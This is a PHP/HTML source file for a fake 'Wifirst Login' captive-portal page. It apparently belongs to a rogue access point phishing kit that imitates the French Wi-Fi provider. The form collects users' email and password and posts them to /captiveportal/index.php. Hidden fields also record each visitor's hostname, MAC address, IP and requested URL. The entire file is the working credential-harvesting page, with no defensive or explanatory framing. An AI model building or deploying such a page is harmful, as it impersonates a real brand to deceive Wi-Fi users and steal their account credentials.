<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link href='assets/css/bootstrap.min.css' rel="stylesheet">
    <style>
      body {
        background-color: #f8f9fa;
      }
      .card {
        margin-top: 100px;
        border: none;
        border-radius: 10px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
      }
      .card-header {
        background-color: #dc3545;
        color: #fff;
        text-align: center;
        font-weight: bold;
        border-radius: 10px 10px 0 0;
      }
      .form-control:focus {
        border-color: #dc3545;
        box-shadow: none;
      }
      .btn-primary {
        background-color: #dc3545;
        border-color: #dc3545;
      }
      .btn-primary:hover {
        background-color: #c82333;
        border-color: #bd2130;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="row justify-content-center">
        <div class="col-md-6">
          <div class="card">
            <div class="card-header">
              Wifirst Login
            </div>
            <div class="card-body">
              <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" id='email-form-step'>
                <div class="form-group">
                  <label for="email">Email</label>
                  <input type="email" class="form-control" id="email" name="email" required>
                </div>
                <div class="form-group">
                  <label for="password">Password</label>
                  <input type="password" class="form-control" id="password" name="password" required>
                </div>
                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                <input type="hidden" name="target" value="<?=$destination?>">
                <button type="submit" class="btn btn-primary btn-block">Se connecter</button>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script src='assets/js/jquery-3.4.1.min.js'></script>
    <script src="assets/js/popper.min.js"></script>
    <script src='assets/js/bootstrap.min.js'></script>
  </body>
</html>
